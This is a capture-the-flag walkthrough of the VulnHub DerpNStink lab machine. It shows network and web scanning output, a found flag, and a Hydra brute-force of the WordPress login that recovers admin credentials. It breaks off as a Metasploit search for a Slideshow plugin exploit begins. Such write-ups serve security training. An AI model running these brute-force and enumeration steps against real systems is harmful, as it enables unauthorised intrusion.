
# DerpNStink - CTF

Available on VulnHub: https://www.vulnhub.com/entry/derpnstink-1,221/


## Walkthrough

### IP Discovery

```
$ sudo netdiscover -r 192.168.1.0/16
```

```
Currently scanning: Finished!   |   Screen View: Unique Hosts

0 Captured ARP Req/Rep packets, from 0 hosts.   Total size: 0
_____________________________________________________________________________
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
xxx.xxx.x.x     xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
192.168.1.127   08:00:27:fe:aa:0e      1      xx  PCS Systemtechnik GmbH
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

### Port Scanning

```
$ nmap -AT4 -p- 192.168.1.127
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-11 16:02 EDT
Nmap scan report for 192.168.1.127
Host is up (0.0090s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 2 disallowed entries
|_/php/ /temporary/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: DeRPnStiNK
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.18 seconds
```

### Flag #1

HTML Source Inspection
```
.
..
...
<--flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166) -->
...
..
.
```

### Web Analysis

```
$ nikto -host http://192.168.1.127

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.127
+ Target Hostname:    192.168.1.127
+ Target Port:        80
+ Start Time:         2020-10-11 17:03:51 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/temporary/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Server may leak inodes via ETags, header found with file /, inode: 512, size: 55dcb6aaa2f50, mtime: gzip
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST
+ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.22
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7917 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2020-10-11 17:04:46 (GMT-4) (55 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```
$ dirb http://192.168.1.127

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sun Oct 11 17:03:40 2020
URL_BASE: http://192.168.1.127/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.1.127/ ----
==> DIRECTORY: http://192.168.1.127/css/
+ http://192.168.1.127/index.html (CODE:200|SIZE:1298)
==> DIRECTORY: http://192.168.1.127/javascript/
==> DIRECTORY: http://192.168.1.127/js/
==> DIRECTORY: http://192.168.1.127/php/
+ http://192.168.1.127/robots.txt (CODE:200|SIZE:53)
+ http://192.168.1.127/server-status (CODE:403|SIZE:293)
==> DIRECTORY: http://192.168.1.127/temporary/
==> DIRECTORY: http://192.168.1.127/weblog/

---- Entering directory: http://192.168.1.127/css/ ----

---- Entering directory: http://192.168.1.127/javascript/ ----
==> DIRECTORY: http://192.168.1.127/javascript/jquery/

---- Entering directory: http://192.168.1.127/js/ ----

---- Entering directory: http://192.168.1.127/php/ ----
+ http://192.168.1.127/php/info.php (CODE:200|SIZE:0)
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/

---- Entering directory: http://192.168.1.127/temporary/ ----
+ http://192.168.1.127/temporary/index.html (CODE:200|SIZE:12)

---- Entering directory: http://192.168.1.127/weblog/ ----
+ http://192.168.1.127/weblog/index.php (CODE:200|SIZE:14674)
==> DIRECTORY: http://192.168.1.127/weblog/wp-admin/
==> DIRECTORY: http://192.168.1.127/weblog/wp-content/
==> DIRECTORY: http://192.168.1.127/weblog/wp-includes/
+ http://192.168.1.127/weblog/xmlrpc.php (CODE:405|SIZE:42)

---- Entering directory: http://192.168.1.127/javascript/jquery/ ----
+ http://192.168.1.127/javascript/jquery/jquery (CODE:200|SIZE:252879)
+ http://192.168.1.127/javascript/jquery/version (CODE:200|SIZE:5)

---- Entering directory: http://192.168.1.127/php/phpmyadmin/ ----
+ http://192.168.1.127/php/phpmyadmin/favicon.ico (CODE:200|SIZE:18902)
+ http://192.168.1.127/php/phpmyadmin/index.php (CODE:200|SIZE:8266)
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/js/
+ http://192.168.1.127/php/phpmyadmin/libraries (CODE:403|SIZE:304)
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/
+ http://192.168.1.127/php/phpmyadmin/phpinfo.php (CODE:200|SIZE:8268)
+ http://192.168.1.127/php/phpmyadmin/setup (CODE:401|SIZE:459)
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/themes/

---- Entering directory: http://192.168.1.127/weblog/wp-admin/ ----
+ http://192.168.1.127/weblog/wp-admin/admin.php (CODE:302|SIZE:0)
==> DIRECTORY: http://192.168.1.127/weblog/wp-admin/css/
==> DIRECTORY: http://192.168.1.127/weblog/wp-admin/images/
==> DIRECTORY: http://192.168.1.127/weblog/wp-admin/includes/
+ http://192.168.1.127/weblog/wp-admin/index.php (CODE:302|SIZE:0)
==> DIRECTORY: http://192.168.1.127/weblog/wp-admin/js/
==> DIRECTORY: http://192.168.1.127/weblog/wp-admin/maint/
==> DIRECTORY: http://192.168.1.127/weblog/wp-admin/network/
==> DIRECTORY: http://192.168.1.127/weblog/wp-admin/user/

---- Entering directory: http://192.168.1.127/weblog/wp-content/ ----
+ http://192.168.1.127/weblog/wp-content/index.php (CODE:200|SIZE:0)
==> DIRECTORY: http://192.168.1.127/weblog/wp-content/plugins/
==> DIRECTORY: http://192.168.1.127/weblog/wp-content/themes/
==> DIRECTORY: http://192.168.1.127/weblog/wp-content/upgrade/
==> DIRECTORY: http://192.168.1.127/weblog/wp-content/uploads/

---- Entering directory: http://192.168.1.127/weblog/wp-includes/ ----
==> DIRECTORY: http://192.168.1.127/weblog/wp-includes/certificates/
==> DIRECTORY: http://192.168.1.127/weblog/wp-includes/css/
==> DIRECTORY: http://192.168.1.127/weblog/wp-includes/customize/
==> DIRECTORY: http://192.168.1.127/weblog/wp-includes/fonts/
==> DIRECTORY: http://192.168.1.127/weblog/wp-includes/images/
==> DIRECTORY: http://192.168.1.127/weblog/wp-includes/js/
==> DIRECTORY: http://192.168.1.127/weblog/wp-includes/widgets/

---- Entering directory: http://192.168.1.127/php/phpmyadmin/js/ ----
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/js/jquery/

---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/ ----
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/ar/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/bg/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/ca/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/cs/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/da/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/de/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/el/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/es/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/et/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/fi/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/fr/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/gl/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/hi/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/hr/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/hu/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/id/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/it/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/ja/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/ko/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/lt/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/nl/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/pl/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/pt/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/pt_BR/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/ro/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/ru/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/si/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/sk/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/sl/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/sv/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/th/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/tr/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/uk/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/zh_CN/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/locale/zh_TW/

---- Entering directory: http://192.168.1.127/php/phpmyadmin/themes/ ----
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/themes/original/

---- Entering directory: http://192.168.1.127/weblog/wp-admin/css/ ----
---- Entering directory: http://192.168.1.127/weblog/wp-admin/images/ ----

---- Entering directory: http://192.168.1.127/weblog/wp-admin/includes/ ----
+ http://192.168.1.127/weblog/wp-admin/includes/admin.php (CODE:500|SIZE:0)

---- Entering directory: http://192.168.1.127/weblog/wp-admin/js/ ----
---- Entering directory: http://192.168.1.127/weblog/wp-admin/maint/ ----

---- Entering directory: http://192.168.1.127/weblog/wp-admin/network/ ----
+ http://192.168.1.127/weblog/wp-admin/network/admin.php (CODE:302|SIZE:0)
+ http://192.168.1.127/weblog/wp-admin/network/index.php (CODE:302|SIZE:0)

---- Entering directory: http://192.168.1.127/weblog/wp-admin/user/ ----
+ http://192.168.1.127/weblog/wp-admin/user/admin.php (CODE:302|SIZE:0)
+ http://192.168.1.127/weblog/wp-admin/user/index.php (CODE:302|SIZE:0)

---- Entering directory: http://192.168.1.127/weblog/wp-content/plugins/ ----
+ http://192.168.1.127/weblog/wp-content/plugins/index.php (CODE:200|SIZE:0)

---- Entering directory: http://192.168.1.127/weblog/wp-content/themes/ ----
+ http://192.168.1.127/weblog/wp-content/themes/index.php (CODE:200|SIZE:0)

---- Entering directory: http://192.168.1.127/weblog/wp-content/upgrade/ ----
---- Entering directory: http://192.168.1.127/weblog/wp-content/uploads/ ----
---- Entering directory: http://192.168.1.127/weblog/wp-includes/certificates/ ----
---- Entering directory: http://192.168.1.127/weblog/wp-includes/css/ ----
---- Entering directory: http://192.168.1.127/weblog/wp-includes/customize/ ----
---- Entering directory: http://192.168.1.127/weblog/wp-includes/fonts/ ----

---- Entering directory: http://192.168.1.127/weblog/wp-includes/images/ ----
==> DIRECTORY: http://192.168.1.127/weblog/wp-includes/images/media/
==> DIRECTORY: http://192.168.1.127/weblog/wp-includes/images/smilies/

---- Entering directory: http://192.168.1.127/weblog/wp-includes/js/ ----
==> DIRECTORY: http://192.168.1.127/weblog/wp-includes/js/jquery/
+ http://192.168.1.127/weblog/wp-includes/js/swfobject.js (CODE:200|SIZE:10231)
==> DIRECTORY: http://192.168.1.127/weblog/wp-includes/js/thickbox/
==> DIRECTORY: http://192.168.1.127/weblog/wp-includes/js/tinymce/

---- Entering directory: http://192.168.1.127/weblog/wp-includes/widgets/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/js/jquery/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/ar/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/bg/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/ca/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/cs/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/da/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/de/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/el/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/es/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/et/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/fi/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/fr/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/gl/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/hi/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/hr/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/hu/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/id/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/it/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/ja/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/ko/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/lt/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/nl/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/pl/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/pt/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/pt_BR/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/ro/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/ru/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/si/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/sk/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/sl/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/sv/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/th/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/tr/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/uk/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/zh_CN/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/locale/zh_TW/ ----

---- Entering directory: http://192.168.1.127/php/phpmyadmin/themes/original/ ----
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/themes/original/css/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/themes/original/img/
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/themes/original/jquery/

---- Entering directory: http://192.168.1.127/weblog/wp-includes/images/media/ ----
---- Entering directory: http://192.168.1.127/weblog/wp-includes/images/smilies/ ----

---- Entering directory: http://192.168.1.127/weblog/wp-includes/js/jquery/ ----
==> DIRECTORY: http://192.168.1.127/weblog/wp-includes/js/jquery/ui/

---- Entering directory: http://192.168.1.127/weblog/wp-includes/js/thickbox/ ----

---- Entering directory: http://192.168.1.127/weblog/wp-includes/js/tinymce/ ----
==> DIRECTORY: http://192.168.1.127/weblog/wp-includes/js/tinymce/langs/
==> DIRECTORY: http://192.168.1.127/weblog/wp-includes/js/tinymce/plugins/
==> DIRECTORY: http://192.168.1.127/weblog/wp-includes/js/tinymce/skins/
==> DIRECTORY: http://192.168.1.127/weblog/wp-includes/js/tinymce/themes/
==> DIRECTORY: http://192.168.1.127/weblog/wp-includes/js/tinymce/utils/

---- Entering directory: http://192.168.1.127/php/phpmyadmin/themes/original/css/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/themes/original/img/ ----

---- Entering directory: http://192.168.1.127/php/phpmyadmin/themes/original/jquery/ ----
==> DIRECTORY: http://192.168.1.127/php/phpmyadmin/themes/original/jquery/images/

---- Entering directory: http://192.168.1.127/weblog/wp-includes/js/jquery/ui/ ----
---- Entering directory: http://192.168.1.127/weblog/wp-includes/js/tinymce/langs/ ----

---- Entering directory: http://192.168.1.127/weblog/wp-includes/js/tinymce/plugins/ ----
==> DIRECTORY: http://192.168.1.127/weblog/wp-includes/js/tinymce/plugins/hr/
==> DIRECTORY: http://192.168.1.127/weblog/wp-includes/js/tinymce/plugins/image/
==> DIRECTORY: http://192.168.1.127/weblog/wp-includes/js/tinymce/plugins/lists/
==> DIRECTORY: http://192.168.1.127/weblog/wp-includes/js/tinymce/plugins/media/
==> DIRECTORY: http://192.168.1.127/weblog/wp-includes/js/tinymce/plugins/wordpress/

---- Entering directory: http://192.168.1.127/weblog/wp-includes/js/tinymce/skins/ ----
==> DIRECTORY: http://192.168.1.127/weblog/wp-includes/js/tinymce/skins/wordpress/

---- Entering directory: http://192.168.1.127/weblog/wp-includes/js/tinymce/themes/ ----
---- Entering directory: http://192.168.1.127/weblog/wp-includes/js/tinymce/utils/ ----
---- Entering directory: http://192.168.1.127/php/phpmyadmin/themes/original/jquery/images/ ----
---- Entering directory: http://192.168.1.127/weblog/wp-includes/js/tinymce/plugins/hr/ ----
---- Entering directory: http://192.168.1.127/weblog/wp-includes/js/tinymce/plugins/image/ ----
---- Entering directory: http://192.168.1.127/weblog/wp-includes/js/tinymce/plugins/lists/ ----
---- Entering directory: http://192.168.1.127/weblog/wp-includes/js/tinymce/plugins/media/ ----
---- Entering directory: http://192.168.1.127/weblog/wp-includes/js/tinymce/plugins/wordpress/ ----

---- Entering directory: http://192.168.1.127/weblog/wp-includes/js/tinymce/skins/wordpress/ ----
==> DIRECTORY: http://192.168.1.127/weblog/wp-includes/js/tinymce/skins/wordpress/images/

---- Entering directory: http://192.168.1.127/weblog/wp-includes/js/tinymce/skins/wordpress/images/ ----

-----------------
END_TIME: Sun Oct 11 17:07:18 2020
DOWNLOADED: 424304 - FOUND: 25
```

Update `/etc/hosts` with **derpnstink.local** DNS
```
192.168.1.127 derpnstink.local
```

PhP MyAdmin Login Page: http://192.168.1.127/php/phpmyadmin/index.php \
WordPress Login Page: http://derpnstink.local/weblog/wp-login.php \
WebLog Page: http://192.168.1.127/weblog/index.php

### WordPress Analysis

```
$ wpscan -e --url http://derpnstink.local/weblog/
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.2
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://derpnstink.local/weblog/ [192.168.1.127]
[+] Started: Sun Oct 11 17:38:16 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.7 (Ubuntu)
 |  - X-Powered-By: PHP/5.5.9-1ubuntu4.22
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://derpnstink.local/weblog/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By:
 |  - Link Tag (Passive Detection), 30% confidence
 |  - Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://derpnstink.local/weblog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://derpnstink.local/weblog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.6.19 identified (Latest, released on 2020-06-10).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://derpnstink.local/weblog/, Match: '-release.min.js?ver=4.6.19'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://derpnstink.local/weblog/, Match: 'WordPress 4.6.19'

[+] WordPress theme in use: twentysixteen
 | Location: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/readme.txt
 | [!] The version is out of date, the latest version is 2.2
 | Style URL: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/style.css?ver=4.6.19
 | Style Name: Twenty Sixteen
 | Style URI: https://wordpress.org/themes/twentysixteen/
 | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://derpnstink.local/weblog/wp-content/themes/twentysixteen/style.css?ver=4.6.19, Match: 'Version: 1.3'

[+] Enumerating Vulnerable Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:00 <=> (329 / 329) 100.00% Time: 00:00:00
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:03 <=> (2575 / 2575) 100.00% Time: 00:00:03

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=> (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:00 <=> (36 / 36) 100.00% Time: 00:00:00

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:01 <=> (100 / 100) 100.00% Time: 00:00:01

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] unclestinky
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Sun Oct 11 17:38:26 2020
[+] Requests Done: 3116
[+] Cached Requests: 11
[+] Data Sent: 843.365 KB
[+] Data Received: 776.019 KB
[+] Memory used: 233.938 MB
[+] Elapsed time: 00:00:10
```

Users: **admin**, **unclestink**

### WordPress Login Brute Forcing

I used the BurpSuit as proxy to intercept the WordPress login request
```
POST /weblog/wp-login.php HTTP/1.1
Host: derpnstink.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://derpnstink.local/weblog/wp-login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 115
Connection: close
Cookie: wordpress_test_cookie=WP+Cookie+check
Upgrade-Insecure-Requests: 1

log=admin&pwd=123456&wp-submit=Log+In&redirect_to=http%3A%2F%2Fderpnstink.local%2Fweblog%2Fwp-admin%2F&testcookie=1
```

With the form data of login request, I did the login brute force for admin user with Hydra
```
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt -vV -f -t 4 192.168.1.127 http-post-form "/weblog/wp-login.php:log=^USER^&pwd=^PASS^:login_error"
```

```
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-11 18:01:42
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344400 login tries (l:1/p:14344400), ~3586100 tries per task
[DATA] attacking http-post-form://192.168.1.127:80/weblog/wp-login.php:log=^USER^&pwd=^PASS^:login_error
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 192.168.1.127 - login "admin" - pass "123456" - 1 of 14344400 [child 0] (0/0)
[ATTEMPT] target 192.168.1.127 - login "admin" - pass "12345" - 2 of 14344400 [child 1] (0/0)
[ATTEMPT] target 192.168.1.127 - login "admin" - pass "123456789" - 3 of 14344400 [child 2] (0/0)
[ATTEMPT] target 192.168.1.127 - login "admin" - pass "password" - 4 of 14344400 [child 3] (0/0)
[ATTEMPT] target 192.168.1.127 - login "admin" - pass "iloveyou" - 5 of 14344400 [child 0] (0/0)
[ATTEMPT] target 192.168.1.127 - login "admin" - pass "princess" - 6 of 14344400 [child 3] (0/0)
[ATTEMPT] target 192.168.1.127 - login "admin" - pass "1234567" - 7 of 14344400 [child 1] (0/0)
[ATTEMPT] target 192.168.1.127 - login "admin" - pass "rockyou" - 8 of 14344400 [child 2] (0/0)
[ATTEMPT] target 192.168.1.127 - login "admin" - pass "12345678" - 9 of 14344400 [child 0] (0/0)
[ATTEMPT] target 192.168.1.127 - login "admin" - pass "abc123" - 10 of 14344400 [child 1] (0/0)
[ATTEMPT] target 192.168.1.127 - login "admin" - pass "nicole" - 11 of 14344400 [child 3] (0/0)
[ATTEMPT] target 192.168.1.127 - login "admin" - pass "daniel" - 12 of 14344400 [child 0] (0/0)
[ATTEMPT] target 192.168.1.127 - login "admin" - pass "babygirl" - 13 of 14344400 [child 1] (0/0)
[ATTEMPT] target 192.168.1.127 - login "admin" - pass "monkey" - 14 of 14344400 [child 2] (0/0)
[ATTEMPT] target 192.168.1.127 - login "admin" - pass "lovely" - 15 of 14344400 [child 3] (0/0)
[ATTEMPT] target 192.168.1.127 - login "admin" - pass "admin" - 16 of 14344400 [child 0] (0/0)
[ATTEMPT] target 192.168.1.127 - login "admin" - pass "jessica" - 17 of 14344400 [child 1] (0/0)
[ATTEMPT] target 192.168.1.127 - login "admin" - pass "654321" - 18 of 14344400 [child 2] (0/0)
[ATTEMPT] target 192.168.1.127 - login "admin" - pass "michael" - 19 of 14344400 [child 3] (0/0)
[VERBOSE] Page redirected to http://derpnstink.local/weblog/wp-admin/profile.php
[ATTEMPT] target 192.168.1.127 - login "admin" - pass "ashley" - 20 of 14344400 [child 1] (0/0)
[80][http-post-form] host: 192.168.1.127   login: admin   password: admin
[STATUS] attack finished for 192.168.1.127 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-11 18:01:55
```

WordPress Credentials: **admin** : **admin**

### Exploitation

Exploiting WordPress SlideShow Component ( https://www.exploit-db.com/exploits/34514 )
```
$ msfconsole
msf5 > search slideshow

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
